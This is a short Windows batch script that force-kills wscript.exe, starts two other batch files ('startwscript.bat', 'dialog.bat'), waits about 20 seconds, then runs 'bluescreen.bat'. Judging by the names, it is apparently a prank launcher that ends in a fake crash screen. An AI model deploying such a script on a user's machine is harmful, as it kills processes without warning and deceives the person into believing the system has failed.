@echo off
TASKKILL /IM wscript.exe /F
start startwscript.bat
start dialog.bat
ping localhost -n 20 > nul
bluescreen.bat